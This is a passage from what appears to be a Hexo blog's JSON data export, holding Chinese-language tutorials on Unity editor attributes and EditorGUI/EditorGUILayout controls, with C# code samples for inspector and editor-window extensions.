AssetDatabase.GetAssetPath (Selection.activeObject);\n        //显示子资产\n        foreach (var item in AssetDatabase.LoadAllAssetsAtPath(path)) {\n            item.hideFlags = HideFlags.None;\n        }\n        AssetDatabase.ImportAsset (path);\n    }</code></pre><pre><code>    var parent = AssetDatabase.LoadAssetAtPath&lt;ParentScriptableObject&gt; (PATH);\n    //删除子资产\n    Object.DestroyImmediate (parent.child, true);\n    parent.child = null;\n    AssetDatabase.ImportAsset (PATH);</code></pre><ul>\n<li>4:在Inspector面板上面展示数组<pre><code> SerializedProperty property = serializedObject.FindProperty(&quot;nodePoints&quot;);\n EditorGUI.BeginChangeCheck();\n EditorGUILayout.PropertyField(property, new GUIContent(&quot;位置节点&quot;), true);\n if (EditorGUI.EndChangeCheck())\n {\n     serializedObject.ApplyModifiedProperties();\n }</code></pre></li>\n</ul>\n"},{"title":"2 UnityEditor常用属性","date":"2020-05-11T03:41:32.000Z","top":2,"_content":"\n# UnityEditor常用属性\n\n#####即在编写脚本时,在编辑器上面展示出来的属性不够清晰明了,通过使用编辑器属性扩展可以快速理解含义\n#####继承自UnityEngine.PropertyAttribute\n\n\n* 1:使用Range给int、float、long、double限定范围\n\n```\n        [Range(1,10)]\n        public int t1;\n        [Range(10, 100)]\n        public float t2;\n        [Range(20, 50)]\n        public double t3;\n        [Range(60, 10000000)]\n        public long t4;\n```\n\n* 2:字符串显示,Multiline和TextArea基本没什么区别,不过TextArea比Multiline表现要好的多,一般用TextArea足够.\n\n```\n    [Multiline(5)]\n    public string text1;\n\n    [TextArea(5,10)]\n    public string text2;\n```\n\n* 3:ContextMenuItem功能,扩展脚本编辑的一些操作.对属性进行的扩展,多个属性可调用一个方法,一个属性可调用多个方法,方便强大\n\n```\n    [ContextMenuItem(\"op1\", \"number1\")]\n    [ContextMenuItem(\"op2\", \"number2\")]\n    public int number;\n\n    void number1()\n    {\n        number = Random.Range(0, 100);\n    }\n\n    void number2()\n    {\n        number = 0;\n    }\n```\n\n* 4: color颜色使用ColorUsage进行展示\n\n```\n    public Color color1;\n\n    [ColorUsage (false)]\n    public Color color2;\n\n    [ColorUsage (true, true)]\n    public Color color3;\n```\n\n* 5: 使用组概念,使其更美观舒服\n\n```\n    [Header(\"Player Settings--------------------------------------------------------------------------\")]\n    public Player player;\n    [Serializable]\n    public class Player\n    {\n        public string name;\n\n        [Range(1, 100)]\n        public int hp;\n    }\n\n    [Header(\"Game Settings--------------------------------------------------------------------------\")]\n    public Color background;\n    public Color background1;\n```\n\n* 6: Space 设置2个属性之间的纵向空白区域,使看起来更舒服\n* 7: Tooltip(\"属性解释\"),鼠标浮在属性上方即可展示出来\n* 8: HideInInspector,隐藏一个public的属性,使其不在Inspector中展示,\n* 9: RequireComponent当你添加一个A组件,但是这个组件必须引用另一个B组件,这时在A上面写入RequireComponent(B)\n\n```\npublic class Test2 : MonoBehaviour{}\n\n[RequireComponent(typeof(Test2),typeof(Animation))]\npublic class Test1 : MonoBehaviour{}\n```\n* 10: DisallowMultipleComponent 禁止在一个物体上面添加多个相同的类型,再添加的时候会提示你已经添加了一个这样的类型,不能再次添加\n* 11: AddComponentMenu 在 Component/Scripts 路径后面接 UI/TColor,即可快速添加脚本\n\n```\nusing UnityEngine;\n[AddComponentMenu(\"UI/TColor\")]\npublic class TweenColor : MonoBehaviour{}\n```\n* 12:ExecuteInEditMode属性的作用是在EditMode下也可以执行脚本。Unity中默认情况下，脚本只有在运行的时候才被执行，加上此属性后，不运行程序，也能执行脚本。\n与PlayMode不同的是，函数并不会不停的执行。\nUpdate : 只有当场景中的某个物体发生变化时，才调用。\nOnGUI : 当GameView接收到一个Event时才调用。\nOnRenderObject 和其他的渲染回调函数 : SceneVidw或者GameView重绘时，调用。\nAwake与Start调用规则：\nAwake：加载时调用。\nStart：第一次激活时调用。(刚被挂载上)\n这个与运行模式下的调用规则一致。参见《unity-----函数执行顺序》。\n   需要注意的是，由于在两种模式下都可以运行，所有，切换模式的那一刻，值得我们留 意一下。\n   不管是从编辑模式进入运行模式，还是从运行模式进入编辑模式，unity都会重新加载资源，所以：\n当该MonoBehavior在编辑器中被赋于给GameObject的时候，Awake, Start 将被执行。\n当Play按钮被按下游戏开始以后，Awake, Start 将被执行。\n当Play按钮停止后，Awake, Start将再次被执行。\n当在编辑器中打开包含有该MonoBehavior的场景的时候，Awake, Start将被执行。\n\n* 13:ContextMenu 类似于ContextMenuItem\n```\n        [Range (0, 10)]\n        public int number;\n        [ContextMenu (\"RandomNumber\")]\n        void RandomNumber ()\n        {\n            number = Random.Range (0, 100);\n        }\n\n        [ContextMenu (\"ResetNumber\")]\n        void ResetNumber ()\n        {\n            number = 0;\n        }\n```\n* 14:HelpURL()提供一个自定义的文档链接，点击组件上的文档图标既能打开到你指定的链接,一定要写上 http:// 或者 https://","source":"_posts/Unity/UnityEditor/2 UnityEditor常用属性.md","raw":"---\ntitle: 2 UnityEditor常用属性\ndate: 2020-05-11 11:41:32\ntop: 2\ncategories:\n- Unity\ntags:\n- UnityEditor\n---\n\n# UnityEditor常用属性\n\n#####即在编写脚本时,在编辑器上面展示出来的属性不够清晰明了,通过使用编辑器属性扩展可以快速理解含义\n#####继承自UnityEngine.PropertyAttribute\n\n\n* 1:使用Range给int、float、long、double限定范围\n\n```\n        [Range(1,10)]\n        public int t1;\n        [Range(10, 100)]\n        public float t2;\n        [Range(20, 50)]\n        public double t3;\n        [Range(60, 10000000)]\n        public long t4;\n```\n\n* 2:字符串显示,Multiline和TextArea基本没什么区别,不过TextArea比Multiline表现要好的多,一般用TextArea足够.\n\n```\n    [Multiline(5)]\n    public string text1;\n\n    [TextArea(5,10)]\n    public string text2;\n```\n\n* 3:ContextMenuItem功能,扩展脚本编辑的一些操作.对属性进行的扩展,多个属性可调用一个方法,一个属性可调用多个方法,方便强大\n\n```\n    [ContextMenuItem(\"op1\", \"number1\")]\n    [ContextMenuItem(\"op2\", \"number2\")]\n    public int number;\n\n    void number1()\n    {\n        number = Random.Range(0, 100);\n    }\n\n    void number2()\n    {\n        number = 0;\n    }\n```\n\n* 4: color颜色使用ColorUsage进行展示\n\n```\n    public Color color1;\n\n    [ColorUsage (false)]\n    public Color color2;\n\n    [ColorUsage (true, true)]\n    public Color color3;\n```\n\n* 5: 使用组概念,使其更美观舒服\n\n```\n    [Header(\"Player Settings--------------------------------------------------------------------------\")]\n    public Player player;\n    [Serializable]\n    public class Player\n    {\n        public string name;\n\n        [Range(1, 100)]\n        public int hp;\n    }\n\n    [Header(\"Game Settings--------------------------------------------------------------------------\")]\n    public Color background;\n    public Color background1;\n```\n\n* 6: Space 设置2个属性之间的纵向空白区域,使看起来更舒服\n* 7: Tooltip(\"属性解释\"),鼠标浮在属性上方即可展示出来\n* 8: HideInInspector,隐藏一个public的属性,使其不在Inspector中展示,\n* 9: RequireComponent当你添加一个A组件,但是这个组件必须引用另一个B组件,这时在A上面写入RequireComponent(B)\n\n```\npublic class Test2 : MonoBehaviour{}\n\n[RequireComponent(typeof(Test2),typeof(Animation))]\npublic class Test1 : MonoBehaviour{}\n```\n* 10: DisallowMultipleComponent 禁止在一个物体上面添加多个相同的类型,再添加的时候会提示你已经添加了一个这样的类型,不能再次添加\n* 11: AddComponentMenu 在 Component/Scripts 路径后面接 UI/TColor,即可快速添加脚本\n\n```\nusing UnityEngine;\n[AddComponentMenu(\"UI/TColor\")]\npublic class TweenColor : MonoBehaviour{}\n```\n* 12:ExecuteInEditMode属性的作用是在EditMode下也可以执行脚本。Unity中默认情况下，脚本只有在运行的时候才被执行，加上此属性后，不运行程序，也能执行脚本。\n与PlayMode不同的是，函数并不会不停的执行。\nUpdate : 只有当场景中的某个物体发生变化时，才调用。\nOnGUI : 当GameView接收到一个Event时才调用。\nOnRenderObject 和其他的渲染回调函数 : SceneVidw或者GameView重绘时，调用。\nAwake与Start调用规则：\nAwake：加载时调用。\nStart：第一次激活时调用。(刚被挂载上)\n这个与运行模式下的调用规则一致。参见《unity-----函数执行顺序》。\n   需要注意的是，由于在两种模式下都可以运行，所有，切换模式的那一刻，值得我们留 意一下。\n   不管是从编辑模式进入运行模式，还是从运行模式进入编辑模式，unity都会重新加载资源，所以：\n当该MonoBehavior在编辑器中被赋于给GameObject的时候，Awake, Start 将被执行。\n当Play按钮被按下游戏开始以后，Awake, Start 将被执行。\n当Play按钮停止后，Awake, Start将再次被执行。\n当在编辑器中打开包含有该MonoBehavior的场景的时候，Awake, Start将被执行。\n\n* 13:ContextMenu 类似于ContextMenuItem\n```\n        [Range (0, 10)]\n        public int number;\n        [ContextMenu (\"RandomNumber\")]\n        void RandomNumber ()\n        {\n            number = Random.Range (0, 100);\n        }\n\n        [ContextMenu (\"ResetNumber\")]\n        void ResetNumber ()\n        {\n            number = 0;\n        }\n```\n* 14:HelpURL()提供一个自定义的文档链接，点击组件上的文档图标既能打开到你指定的链接,一定要写上 http:// 或者 https://","slug":"Unity/UnityEditor/2 UnityEditor常用属性","published":1,"updated":"2020-05-15T02:50:15.666Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0v00572gk760sr1vgk","content":"<h1 id=\"UnityEditor常用属性\"><a href=\"#UnityEditor常用属性\" class=\"headerlink\" title=\"UnityEditor常用属性\"></a>UnityEditor常用属性</h1><p>#####即在编写脚本时,在编辑器上面展示出来的属性不够清晰明了,通过使用编辑器属性扩展可以快速理解含义<br>#####继承自UnityEngine.PropertyAttribute</p>\n<ul>\n<li>1:使用Range给int、float、long、double限定范围</li>\n</ul>\n<pre><code>        [Range(1,10)]\n        public int t1;\n        [Range(10, 100)]\n        public float t2;\n        [Range(20, 50)]\n        public double t3;\n        [Range(60, 10000000)]\n        public long t4;</code></pre><ul>\n<li>2:字符串显示,Multiline和TextArea基本没什么区别,不过TextArea比Multiline表现要好的多,一般用TextArea足够.</li>\n</ul>\n<pre><code>    [Multiline(5)]\n    public string text1;\n\n    [TextArea(5,10)]\n    public string text2;</code></pre><ul>\n<li>3:ContextMenuItem功能,扩展脚本编辑的一些操作.对属性进行的扩展,多个属性可调用一个方法,一个属性可调用多个方法,方便强大</li>\n</ul>\n<pre><code>    [ContextMenuItem(&quot;op1&quot;, &quot;number1&quot;)]\n    [ContextMenuItem(&quot;op2&quot;, &quot;number2&quot;)]\n    public int number;\n\n    void number1()\n    {\n        number = Random.Range(0, 100);\n    }\n\n    void number2()\n    {\n        number = 0;\n    }</code></pre><ul>\n<li>4: color颜色使用ColorUsage进行展示</li>\n</ul>\n<pre><code>    public Color color1;\n\n    [ColorUsage (false)]\n    public Color color2;\n\n    [ColorUsage (true, true)]\n    public Color color3;</code></pre><ul>\n<li>5: 使用组概念,使其更美观舒服</li>\n</ul>\n<pre><code>    [Header(&quot;Player Settings--------------------------------------------------------------------------&quot;)]\n    public Player player;\n    [Serializable]\n    public class Player\n    {\n        public string name;\n\n        [Range(1, 100)]\n        public int hp;\n    }\n\n    [Header(&quot;Game Settings--------------------------------------------------------------------------&quot;)]\n    public Color background;\n    public Color background1;</code></pre><ul>\n<li>6: Space 设置2个属性之间的纵向空白区域,使看起来更舒服</li>\n<li>7: Tooltip(“属性解释”),鼠标浮在属性上方即可展示出来</li>\n<li>8: HideInInspector,隐藏一个public的属性,使其不在Inspector中展示,</li>\n<li>9: RequireComponent当你添加一个A组件,但是这个组件必须引用另一个B组件,这时在A上面写入RequireComponent(B)</li>\n</ul>\n<pre><code>public class Test2 : MonoBehaviour{}\n\n[RequireComponent(typeof(Test2),typeof(Animation))]\npublic class Test1 : MonoBehaviour{}</code></pre><ul>\n<li>10: DisallowMultipleComponent 禁止在一个物体上面添加多个相同的类型,再添加的时候会提示你已经添加了一个这样的类型,不能再次添加</li>\n<li>11: AddComponentMenu 在 Component/Scripts 路径后面接 UI/TColor,即可快速添加脚本</li>\n</ul>\n<pre><code>using UnityEngine;\n[AddComponentMenu(&quot;UI/TColor&quot;)]\npublic class TweenColor : MonoBehaviour{}</code></pre><ul>\n<li><p>12:ExecuteInEditMode属性的作用是在EditMode下也可以执行脚本。Unity中默认情况下，脚本只有在运行的时候才被执行，加上此属性后，不运行程序，也能执行脚本。<br>与PlayMode不同的是，函数并不会不停的执行。<br>Update : 只有当场景中的某个物体发生变化时，才调用。<br>OnGUI : 当GameView接收到一个Event时才调用。<br>OnRenderObject 和其他的渲染回调函数 : SceneVidw或者GameView重绘时，调用。<br>Awake与Start调用规则：<br>Awake：加载时调用。<br>Start：第一次激活时调用。(刚被挂载上)<br>这个与运行模式下的调用规则一致。参见《unity—–函数执行顺序》。<br> 需要注意的是，由于在两种模式下都可以运行，所有，切换模式的那一刻，值得我们留 意一下。<br> 不管是从编辑模式进入运行模式，还是从运行模式进入编辑模式，unity都会重新加载资源，所以：<br>当该MonoBehavior在编辑器中被赋于给GameObject的时候，Awake, Start 将被执行。<br>当Play按钮被按下游戏开始以后，Awake, Start 将被执行。<br>当Play按钮停止后，Awake, Start将再次被执行。<br>当在编辑器中打开包含有该MonoBehavior的场景的时候，Awake, Start将被执行。</p>\n</li>\n<li><p>13:ContextMenu 类似于ContextMenuItem</p>\n<pre><code>      [Range (0, 10)]\n      public int number;\n      [ContextMenu (&quot;RandomNumber&quot;)]\n      void RandomNumber ()\n      {\n          number = Random.Range (0, 100);\n      }\n\n      [ContextMenu (&quot;ResetNumber&quot;)]\n      void ResetNumber ()\n      {\n          number = 0;\n      }</code></pre></li>\n<li><p>14:HelpURL()提供一个自定义的文档链接，点击组件上的文档图标既能打开到你指定的链接,一定要写上 http:// 或者 https://</p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"UnityEditor常用属性\"><a href=\"#UnityEditor常用属性\" class=\"headerlink\" title=\"UnityEditor常用属性\"></a>UnityEditor常用属性</h1><p>#####即在编写脚本时,在编辑器上面展示出来的属性不够清晰明了,通过使用编辑器属性扩展可以快速理解含义<br>#####继承自UnityEngine.PropertyAttribute</p>\n<ul>\n<li>1:使用Range给int、float、long、double限定范围</li>\n</ul>\n<pre><code>        [Range(1,10)]\n        public int t1;\n        [Range(10, 100)]\n        public float t2;\n        [Range(20, 50)]\n        public double t3;\n        [Range(60, 10000000)]\n        public long t4;</code></pre><ul>\n<li>2:字符串显示,Multiline和TextArea基本没什么区别,不过TextArea比Multiline表现要好的多,一般用TextArea足够.</li>\n</ul>\n<pre><code>    [Multiline(5)]\n    public string text1;\n\n    [TextArea(5,10)]\n    public string text2;</code></pre><ul>\n<li>3:ContextMenuItem功能,扩展脚本编辑的一些操作.对属性进行的扩展,多个属性可调用一个方法,一个属性可调用多个方法,方便强大</li>\n</ul>\n<pre><code>    [ContextMenuItem(&quot;op1&quot;, &quot;number1&quot;)]\n    [ContextMenuItem(&quot;op2&quot;, &quot;number2&quot;)]\n    public int number;\n\n    void number1()\n    {\n        number = Random.Range(0, 100);\n    }\n\n    void number2()\n    {\n        number = 0;\n    }</code></pre><ul>\n<li>4: color颜色使用ColorUsage进行展示</li>\n</ul>\n<pre><code>    public Color color1;\n\n    [ColorUsage (false)]\n    public Color color2;\n\n    [ColorUsage (true, true)]\n    public Color color3;</code></pre><ul>\n<li>5: 使用组概念,使其更美观舒服</li>\n</ul>\n<pre><code>    [Header(&quot;Player Settings--------------------------------------------------------------------------&quot;)]\n    public Player player;\n    [Serializable]\n    public class Player\n    {\n        public string name;\n\n        [Range(1, 100)]\n        public int hp;\n    }\n\n    [Header(&quot;Game Settings--------------------------------------------------------------------------&quot;)]\n    public Color background;\n    public Color background1;</code></pre><ul>\n<li>6: Space 设置2个属性之间的纵向空白区域,使看起来更舒服</li>\n<li>7: Tooltip(“属性解释”),鼠标浮在属性上方即可展示出来</li>\n<li>8: HideInInspector,隐藏一个public的属性,使其不在Inspector中展示,</li>\n<li>9: RequireComponent当你添加一个A组件,但是这个组件必须引用另一个B组件,这时在A上面写入RequireComponent(B)</li>\n</ul>\n<pre><code>public class Test2 : MonoBehaviour{}\n\n[RequireComponent(typeof(Test2),typeof(Animation))]\npublic class Test1 : MonoBehaviour{}</code></pre><ul>\n<li>10: DisallowMultipleComponent 禁止在一个物体上面添加多个相同的类型,再添加的时候会提示你已经添加了一个这样的类型,不能再次添加</li>\n<li>11: AddComponentMenu 在 Component/Scripts 路径后面接 UI/TColor,即可快速添加脚本</li>\n</ul>\n<pre><code>using UnityEngine;\n[AddComponentMenu(&quot;UI/TColor&quot;)]\npublic class TweenColor : MonoBehaviour{}</code></pre><ul>\n<li><p>12:ExecuteInEditMode属性的作用是在EditMode下也可以执行脚本。Unity中默认情况下，脚本只有在运行的时候才被执行，加上此属性后，不运行程序，也能执行脚本。<br>与PlayMode不同的是，函数并不会不停的执行。<br>Update : 只有当场景中的某个物体发生变化时，才调用。<br>OnGUI : 当GameView接收到一个Event时才调用。<br>OnRenderObject 和其他的渲染回调函数 : SceneVidw或者GameView重绘时，调用。<br>Awake与Start调用规则：<br>Awake：加载时调用。<br>Start：第一次激活时调用。(刚被挂载上)<br>这个与运行模式下的调用规则一致。参见《unity—–函数执行顺序》。<br> 需要注意的是，由于在两种模式下都可以运行，所有，切换模式的那一刻，值得我们留 意一下。<br> 不管是从编辑模式进入运行模式，还是从运行模式进入编辑模式，unity都会重新加载资源，所以：<br>当该MonoBehavior在编辑器中被赋于给GameObject的时候，Awake, Start 将被执行。<br>当Play按钮被按下游戏开始以后，Awake, Start 将被执行。<br>当Play按钮停止后，Awake, Start将再次被执行。<br>当在编辑器中打开包含有该MonoBehavior的场景的时候，Awake, Start将被执行。</p>\n</li>\n<li><p>13:ContextMenu 类似于ContextMenuItem</p>\n<pre><code>      [Range (0, 10)]\n      public int number;\n      [ContextMenu (&quot;RandomNumber&quot;)]\n      void RandomNumber ()\n      {\n          number = Random.Range (0, 100);\n      }\n\n      [ContextMenu (&quot;ResetNumber&quot;)]\n      void ResetNumber ()\n      {\n          number = 0;\n      }</code></pre></li>\n<li><p>14:HelpURL()提供一个自定义的文档链接，点击组件上的文档图标既能打开到你指定的链接,一定要写上 http:// 或者 https://</p>\n</li>\n</ul>\n"},{"title":"4 EditorGUI","date":"2020-05-11T03:41:32.000Z","top":4,"_content":"# EdirotGUILayout / EdirotGUI 方法的简单使用\n\n* 1:编写一个EditorWindow并展示一个label\n\n```\n    public class TestEditorWindow : EditorWindow\n    {\n        [MenuItem(\"Window/Example\")]\n        static void Open()\n        {\n            GetWindow<TestEditorWindow>();\n        }\n\n        void OnGUI()\n        {\n            EditorGUILayout.LabelField(\"Example Label\");\n        }\n    }\n```\n* 2:Toggle\n```\n    bool showBtn = true;\n    void OnGUI()\n    {\n        showBtn = EditorGUILayout.Toggle(\"Show Button\",showBtn);\n        if(showBtn){  //开关点开\n            if(GUILayout.Button(\"Close\")){ //绘制按钮\n                this.Close(); //关闭面板\n            }\n        }\n    }\n```\n```\n    void OnGUI()\n    {\n        EditorGUI.BeginChangeCheck();\n\n        toggleValue = EditorGUILayout.ToggleLeft(\"Toggle\", toggleValue);\n\n        //toggleValue 值每次改变时,EditorGUI.EndChangeCheck()都返回true\n        if (EditorGUI.EndChangeCheck())\n        {\n            if (toggleValue)\n            {\n                Debug.Log(\"toggleValue:\" + toggleValue);\n            }\n            else\n            {\n                Debug.Log(\"toggleValue:\" + toggleValue);\n            }\n        }\n        bool on = GUILayout.Toggle(on, on ? \"on\" : \"off\", \"button\");\n    }\n```\n\n```\n    bool toggleValue;\n\n    Stack<bool> stack = new Stack<bool> ();\n\n    void OnGUI ()\n    {\n        {\n            stack.Push (GUI.changed);\n            GUI.changed = false;\n        }\n        toggleValue = EditorGUILayout.ToggleLeft (\"Toggle\", toggleValue);\n        {\n            bool changed = GUI.changed;\n\n            GUI.changed |= stack.Pop ();\n        }\n        if (changed) {\n            Debug.Log (\"toggleValue\");\n        }\n    }\n\n```\n```\n    bool toggleValue;\n\n    Stack<bool> stack = new Stack<bool>();\n\n    void OnGUI()\n    {\n        stack.Push(GUI.changed);\n        GUI.changed = false;\n        \n        toggleValue = EditorGUILayout.ToggleLeft(\"Toggle\", toggleValue);\n        \n        bool changed = GUI.changed;\n        Debug.Log(\"changed:\" + changed);\n\n        GUI.changed |= stack.Pop();\n\n        if (changed)\n        {\n            Debug.Log(\"toggleValue\");\n        }\n    }\n```\n```\n    private bool groupEnabled; //区域开关\n    void OnGUI()\n    {\n        groupEnabled = EditorGUILayout.BeginToggleGroup(\"Optional Settings\", groupEnabled);\n        ///其他编辑代码\n        EditorGUILayout.EndToggleGroup();\n    }\n```\n* 3:ObjectField\n```\n    void OnGUI ()\n    {\n        EditorGUILayout.ObjectField (null, typeof(Object), false);\n\n        EditorGUILayout.ObjectField (null, typeof(Material), false);\n\n        EditorGUILayout.ObjectField (null, typeof(AudioClip), false);\n\n        var options = new []{GUILayout.Width (64), GUILayout.Height (64)};\n\n        EditorGUILayout.ObjectField (null, typeof(Texture), false, options);\n\n        EditorGUILayout.ObjectField (null, typeof(Sprite), false, options);\n    }\n```\n* 4:EditorGUI.MultiFloatField\n```\n    float[] numbers = new float[] {\n        0,\n        1,\n        2\n    };\n\n    GUIContent[] contents = new GUIContent[] {\n        new GUIContent (\"X\"),\n        new GUIContent (\"Y\"),\n        new GUIContent (\"Z\")\n    };\n\n    void OnGUI()\n    {\n        EditorGUI.MultiFloatField(\n            new Rect(30, 30, 200, EditorGUIUtility.singleLineHeight),\n            new GUIContent(\"Label\"),\n            contents,\n            numbers);\n    }\n```\n* 5: EditorGUI.indentLevel 层级表现\n```\nvoid OnGUI ()\n{\n    EditorGUILayout.LabelField (\"Parent\");\n\n    EditorGUI.indentLevel++;\n\n    EditorGUILayout.LabelField (\"Child\");\n    EditorGUILayout.LabelField (\"Child\");\n\n    EditorGUI.indentLevel--;\n\n    EditorGUILayout.LabelField (\"Parent\");\n\n    EditorGUI.indentLevel++;\n\n    EditorGUILayout.LabelField (\"Child\");\n}\n```\n* 6:EditorGUILayout.Knob,一个圈圈表现\n```\n    float angle = 270;\n\n    void OnGUI()\n    {\n        angle = EditorGUILayout.Knob(Vector2.one * 64,\n            angle, 0, 360, \"度\", Color.gray, Color.red, true);\n    }\n```\n* 7:Scope排版\n```\n    public class HorizontalScope : GUI.Scope\n    {\n            \n        public HorizontalScope()\n        {\n            EditorGUILayout.BeginHorizontal();\n        }\n\n        protected override void CloseScope()\n        {\n            EditorGUILayout.EndHorizontal();\n        }        \n    }\n\n    void OnGUI()\n    {\n\n        using (new EditorGUILayout.HorizontalScope())\n        {\n            GUILayout.Button(\"Button1\");\n            GUILayout.Button(\"Button2\");\n        }\n        using (new EditorGUILayout.HorizontalScope ()) {\n            one = GUILayout.Toggle (one, \"1\", EditorStyles.miniButtonLeft);\n            two = GUILayout.Toggle (two, \"2\", EditorStyles.miniButtonMid);\n            three = GUILayout.Toggle (three, \"3\", EditorStyles.miniButtonRight);\n        }     \n    }\n    \n```\n* 8:Toolbar\n```\n    int selected;\n\n    void OnGUI()\n    {\n        selected = GUILayout.Toolbar(selected, new string[] { \"1\", \"2\", \"3\" });\n        selected = GUILayout.Toolbar(selected, new string[] { \"1\", \"2\", \"3\" }, EditorStyles.toolbarButton);\n        selected = GUILayout.SelectionGrid(selected,new string[] { \"1\", \"2\", \"3\" }, 1, \"PreferencesKeysElement\");\n    }\n```\n* 9:SelectableLabel 可选择标签(通常用于显示只读信息，可以被复制粘贴)\n```\nstring text=\"hiahia\";\n    void OnGUI()\n    {\n        EditorGUILayout.SelectableLabel(text); //文本：可以选择然后复制粘贴\n    }\n```\n* 10:PasswordField 密码字段\n```\n    //创建密码字段并可视化\n    string text = \"Some text here\";\n    bool showBtn = true;\n    void OnGUI() \n    {\n        text = EditorGUILayout.PasswordField(\"Password:\",text);\n        showBtn = EditorGUILayout.Toggle(\"Show Button\", showBtn);\n        if (showBtn)\n        {\n            EditorGUILayout.LabelField(\"密码:\", text);\n        }\n    }\n```\n* 11:Slider 滑动条 IntSlider 整数滑动条 MinMaxSlider 最小最大滑动条\n```\n    //随机放置选择的物体在最小最大滑动条之间\n    float  minVal = -10.0f;\n    float minLimit = -20.0f;\n    float maxVal = 10.0f;\n    float maxLimit = 20.0f;\n    void OnGUI()\n    {\n        EditorGUILayout.LabelField(\"Min Val:\", minVal.ToString());\n        EditorGUILayout.LabelField(\"Max Val:\", maxVal.ToString());\n        EditorGUILayout.MinMaxSlider(ref minVal,ref  maxVal, minLimit, maxLimit);\n\n    }\n```\n* 12:Popup弹出选择菜单\n```\n    string[] options = { \"Cube\",\"Sphere\",\"Plane\"};\n    int index = 0;\n    void OnGUI()\n    {\n        index = EditorGUILayout.Popup(index, options);\n    }\n```\n```\n    enum OPTIONS\n    {\n        CUBE = 0,\n        SPHERE = 1,\n        PLANE = 2\n    }\n    public class myEditor3 : EditorWindow {\n        OPTIONS op=OPTIONS.CUBE;\n        [MenuItem(\"cayman/tempShow\")]\n        static void newWelcome()\n        {\n            EditorWindow.GetWindow(typeof(myEditor3), true, \"Eam\");\n        }\n        void OnGUI()\n        {\n        op = (OPTIONS)EditorGUILayout.EnumPopup(\"Primitive to create:\", op)  ;\n        }\n    }\n```\n```\n    int selectedSize = 1;\n    string[] names = { \"Normal\",\"Double\",\"Quadruple\"};\n    int[] sizes = { 1,2,4};\n    void OnGUI()\n    {\n        selectedSize = EditorGUILayout.IntPopup(\"Resize Scale: \", selectedSize, names, sizes);\n        if (GUILayout.Button(\"Scale\"))\n            ReScale();\n    }\n    void ReScale()\n    {\n        if (Selection.activeTransform)\n            Selection.activeTransform.localScale =new Vector3(selectedSize, selectedSize, selectedSize);\n        else Debug.LogError(\"No Object selected, please select an object to scale.\");\n    }\n```\n\n* 13:ColorField 颜色字段 \n```\n    Color matColor = Color.white;\n    void OnGUI()\n    {\n        matColor = EditorGUILayout.ColorField(\"New Color\", matColor);\n \n    }\n```\n* 14:Vector2Field 二维向量字段 Vector3Field 三维向量字段(略，同2维)\n```\n    float distance = 0;\n    Vector2 p1, p2;\n    void OnGUI()\n    {\n        p1 = EditorGUILayout.Vector2Field(\"Point 1:\", p1);\n        p2 = EditorGUILayout.Vector2Field(\"Point 2:\", p2);\n        EditorGUILayout.LabelField(\"Distance:\", distance.ToString());\n    }\n    void OnInspectorUpdate() //面板刷新\n    {\n        distance = Vector2.Distance(p1, p2);\n        this.Repaint();\n    }\n```\n* 15:TagField 标签字段 LayerField层字段\n```\n    string tagStr = \"\";\n    int selectedLayer=0;\n    void OnGUI()\n    {  //为游戏物体设置\n        tagStr = EditorGUILayout.TagField(\"Tag for Objects:\", tagStr);\n        tagStr = EditorGUILayout.LayerField(\"Layer for Objects:\", selectedLayer);\n        if (GUILayout.Button(\"Set Tag!\"))\n            SetTags();\n        if(GUILayout.Button(\"Set Layer!\"))\n            SetLayer();\n    }\n    void SetTags() {\n        foreach(GameObject go in Selection.gameObjects)\n            go.tag = tagStr;\n    }\n     void SetLayer() {\n        foreach(GameObject go in Selection.gameObjects)\n            go.laye = selectedLayer;\n    }\n```\n* 16:打开保存位置文件夹\n```\nstring path;\nGUILayout.Label (\"Save Path\", EditorStyles.boldLabel);\nEditorGUILayout.BeginHorizontal();\nEditorGUILayout.TextField(path,GUILayout.ExpandWidth(false));\nif(GUILayout.Button(\"Browse\",GUILayout.ExpandWidth(false)))\n            path = EditorUtility.SaveFolderPanel(\"Path to Save Images\",path,Application.dataPath);   //打开保存文件夹面板\nEditorGUILayout.EndHorizontal();\n```\n* 17:折叠标签,下面的player.weaponDamage1和player.weaponDamage2属性,都会被折叠在Weapons标签里面\n```\n        bool showWeapons;\n        showWeapons = EditorGUILayout.Foldout(showWeapons, \"Weapons\");\n        if (showWeapons)\n        {\n            player.weaponDamage1 = EditorGUILayout.FloatField(\"武器伤害1\", player.weaponDamage1);\n            player.weaponDamage2 = EditorGUILayout.FloatField(\"武器伤害1\", player.weaponDamage2);\n        }\n```\n* 18:滑动区域 GUILayout.BeginScrollView  GUILayout.EndScrollView();\n选择网格 SelectionGrid,SelectionGrid(int 选择的索引,sting[] 显示文字数组，xCount，格式)\n```\n    GUIStyle textStyle = new GUIStyle(\"textfield\");\n    GUIStyle buttonStyle = new GUIStyle(\"button\");\n    textStyle.active = buttonStyle.active;\n    textStyle.onNormal = buttonStyle.onNormal;\n\n    v2 = GUILayout.BeginScrollView(v2, true, true, GUILayout.Width(300), GUILayout.Height(100));\n    {\n        v = GUILayout.SelectionGrid(v, Messages, 1, textStyle);\n    }\n    GUILayout.EndScrollView();\n```\n* 19:DragAndDrop中的拖拽区域,拖拽一个物体到windos面板上面,得到路径\n```\n        EditorGUILayout.LabelField(\"路径\");\n        //获得一个长300的框  \n        Rect rect = EditorGUILayout.GetControlRect(GUILayout.Width(600));\n        //将上面的框作为文本输入框  \n        path = EditorGUI.TextField(rect, path);\n\n        //如果鼠标正在拖拽中或拖拽结束时，并且鼠标所在位置在文本输入框内  \n        if ((Event.current.type == EventType.DragUpdated\n          || Event.current.type == EventType.DragExited)\n          && rect.Contains(Event.current.mousePosition))\n        {\n            //改变鼠标的外表  \n            DragAndDrop.visualMode = DragAndDropVisualMode.Generic;\n            if (DragAndDrop.paths != null && DragAndDrop.paths.Length > 0)\n            {\n                path = DragAndDrop.paths[0];\n            }\n        }\n```\n* 20:Box绘制GUI.Box(xxx,xxx)\n* 21:window面板的提示1. 打开一个通知栏 this.ShowNotification(new GUIContent(“This is a Notification”));2. 关闭通知栏 this.RemoveNotification();\n* 22:","source":"_posts/Unity/UnityEditor/4 EditorGUI.md","raw":"---\ntitle: 4 EditorGUI\ndate: 2020-05-11 11:41:32\ntop: 4\ncategories:\n- Unity\ntags:\n- UnityEditor\n---\n# EdirotGUILayout / EdirotGUI 方法的简单使用\n\n* 1:编写一个EditorWindow并展示一个label\n\n```\n    public class TestEditorWindow : 